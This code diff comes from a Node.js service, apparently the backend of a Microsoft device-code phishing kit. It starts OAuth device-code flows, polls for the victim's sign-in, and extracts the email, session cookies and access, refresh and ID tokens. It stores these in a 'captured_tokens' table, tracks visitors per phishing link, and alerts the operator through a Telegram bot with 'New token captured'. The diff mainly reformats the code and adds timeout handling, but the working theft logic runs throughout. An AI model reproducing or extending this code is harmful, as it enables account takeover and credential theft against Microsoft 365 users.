@@ -2,7 +2,6 @@
  * VGenius C Engine – Device Proxy Service
  * Handles Microsoft Device Code OAuth flow proxying
  */
-
 const axios = require('axios');
 const jwt = require('jsonwebtoken');
 const db = require('../database/connection');
@@ -43,14 +42,17 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
     // Call Microsoft Device Code endpoint
     const tenant = config.AZURE_TENANT || 'common';
     const clientId = config.AZURE_CLIENT_ID;
-
     const dcResponse = await axios.post(
       `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`,
       new URLSearchParams({
         client_id: clientId,
         scope: 'openid profile email User.Read offline_access',
       }),
-      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
+      {
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded'
+        }
+      }
     );
 
     const dcData = dcResponse.data;
@@ -104,8 +106,19 @@ async function pollForToken(jobId) {
 
   for (let i = 0; i < maxAttempts; i++) {
     if (!activeJobs.has(jobId)) return; // Job cancelled
+
+    // Check if expired before polling
     if (Date.now() > job.expires_at) {
       job.status = 'expired';
+      // Update visitor status to timeout
+      try {
+        await db.query(
+          'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status = ?',
+          ['timeout', job.user_id, job.link_id, 'waiting']
+        );
+      } catch (e) {
+        /* ignore */
+      }
       return;
     }
 
@@ -119,7 +132,12 @@ async function pollForToken(jobId) {
           client_id: clientId,
           device_code: job.device_code,
         }),
-        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, validateStatus: () => true }
+        {
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+          },
+          validateStatus: () => true
+        }
       );
 
       const tokenData = tokenResponse.data;
@@ -127,16 +145,18 @@ async function pollForToken(jobId) {
       if (tokenData.access_token) {
         // SUCCESS! Store token
         job.status = 'completed';
-        
+
         // Extract email FIRST before using it
         let capturedEmail = null;
         if (tokenData.id_token) {
           try {
             const payload = JSON.parse(Buffer.from(tokenData.id_token.split('.')[1], 'base64').toString());
             capturedEmail = payload.email || payload.upn || payload.preferred_username || null;
-          } catch (e) { /* ignore */ }
+          } catch (e) {
+            /* ignore */
+          }
         }
-        
+
         // Capture Set-Cookie headers from the token response (session cookies)
         const responseCookies = [];
         const setCookieHeaders = tokenResponse.headers['set-cookie'] || [];
@@ -147,25 +167,29 @@ async function pollForToken(jobId) {
             const cookieName = cookieParts.substring(0, eqIndex).trim();
             const cookieValue = cookieParts.substring(eqIndex + 1).trim();
             if (cookieName && cookieValue) {
-              responseCookies.push({ name: cookieName, value: cookieValue, domain: '.login.microsoftonline.com' });
+              responseCookies.push({
+                name: cookieName,
+                value: cookieValue,
+                domain: '.login.microsoftonline.com'
+              });
             }
           }
         }
-        
+
         // Store cookies and email in job for later storage
         job.captured_cookies = responseCookies;
         job.captured_email = capturedEmail;
-        
         await storeToken(job, tokenData, responseCookies);
-        
+
         // Mark visitors as done for this user/link
         try {
           await db.query(
             'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status = ?',
             ['done', job.user_id, job.link_id, 'waiting']
           );
-        } catch (e) { /* silent */ }
-        
+        } catch (e) {
+          /* silent */
+        }
         return;
       }
 
@@ -207,8 +231,16 @@ async function pollForToken(jobId) {
     }
   }
 
-  // Exhausted attempts
+  // Exhausted attempts - mark as expired with visitor timeout
   job.status = 'expired';
+  try {
+    await db.query(
+      'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status = ?',
+      ['timeout', job.user_id, job.link_id, 'waiting']
+    );
+  } catch (e) {
+    /* ignore */
+  }
 }
 
 /**
@@ -218,14 +250,17 @@ async function retryAsTokenMode(originalJob) {
   try {
     const tenant = config.AZURE_TENANT || 'common';
     const clientId = config.AZURE_CLIENT_ID;
-
     const dcResponse = await axios.post(
       `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`,
       new URLSearchParams({
         client_id: clientId,
         scope: 'openid profile email User.Read offline_access',
       }),
-      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
+      {
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded'
+        }
+      }
     );
 
     const dcData = dcResponse.data;
@@ -274,23 +309,26 @@ async function storeToken(job, tokenData, responseCookies = []) {
       try {
         const payload = JSON.parse(Buffer.from(tokenData.id_token.split('.')[1], 'base64').toString());
         email = payload.email || payload.upn || payload.preferred_username || null;
-      } catch (e) { /* ignore */ }
+      } catch (e) {
+        /* ignore */
+      }
     }
 
     // Use stored IP and user-agent from when the flow started
     const ipAddress = job.ip_address || 'unknown';
     const userAgent = job.user_agent || 'DeviceProxy';
-    
+
     // Format cookies for storage
     let cookiesEncrypted = null;
     if (responseCookies && responseCookies.length > 0) {
-      const cookieStrings = responseCookies.map(c => `${c.name}=${c.value}; domain=${c.domain}; path=/; secure`).join('; ');
+      const cookieStrings = responseCookies.map(
+        c => `${c.name}=${c.value}; domain=${c.domain}; path=/; secure`
+      ).join('; ');
       cookiesEncrypted = encrypt(cookieStrings);
     }
 
     const [result] = await db.query(
-      `INSERT INTO captured_tokens 
-       (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted, ip_address, user_agent, expiration)
+      `INSERT INTO captured_tokens (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted, ip_address, user_agent, expiration)
        VALUES (?, ?, ?, 'token', ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR))`,
       [
         job.user_id,
@@ -329,19 +367,26 @@ async function storeToken(job, tokenData, responseCookies = []) {
           created_at: new Date(),
         });
       }
-    } catch (e) { /* silent */ }
+    } catch (e) {
+      /* silent */
+    }
 
     // Send Telegram notification
     try {
       const [users] = await db.query('SELECT telegram_id, telegram_bot_token FROM users WHERE id = ?', [job.user_id]);
       if (users.length && users[0].telegram_id && users[0].telegram_bot_token) {
         const axios = require('axios');
-        await axios.post(`https://api.telegram.org/bot${users[0].telegram_bot_token}/sendMessage`, {
-          chat_id: users[0].telegram_id,
-          text: `🔐 New token captured: ${email || 'unknown'} via Device Code Proxy`,
-        });
+        await axios.post(
+          `https://api.telegram.org/bot${users[0].telegram_bot_token}/sendMessage`,
+          {
+            chat_id: users[0].telegram_id,
+            text: `🔐 New token captured: ${email || 'unknown'} via Device Code Proxy`,
+          }
+        );
       }
-    } catch (e) { /* silent */ }
+    } catch (e) {
+      /* silent */
+    }
 
     console.log(`[DeviceProxy] Token captured for user ${job.user_id}, link ${job.link_id}`);
   } catch (err) {
@@ -351,13 +396,16 @@ async function storeToken(job, tokenData, responseCookies = []) {
 
 /**
  * Poll a specific job status
- * @param {string} jobId 
+ * @param {string} jobId
  * @returns {object} status info
  */
 function getJobStatus(jobId) {
   const job = activeJobs.get(jobId);
   if (!job) {
-    return { status: 'not_found', error: 'Job not found or expired' };
+    return {
+      status: 'not_found',
+      error: 'Job not found or expired'
+    };
   }
 
   // Check expiry
@@ -380,10 +428,8 @@ function getJobStatus(jobId) {
   };
 
   if (job.status === 'polling') {
-    // We need to return the user_code from the original device code response
-    // Since we don't store it in the job, we return the job_id for client tracking
+    // Return waiting status
     result.status = 'waiting_user';
-    // The user_code was returned when the job was created; clients store it
   }
 
   if (job.status === 'expired' || job.status === 'failed') {
@@ -413,7 +459,8 @@ function getJobStatus(jobId) {
 function cleanupJobs() {
   const now = Date.now();
   for (const [id, job] of activeJobs) {
-    if (now > job.expires_at + 300000) { // 5 min grace period
+    if (now > job.expires_at + 300000) {
+      // 5 min grace period
       activeJobs.delete(id);
     }
   }
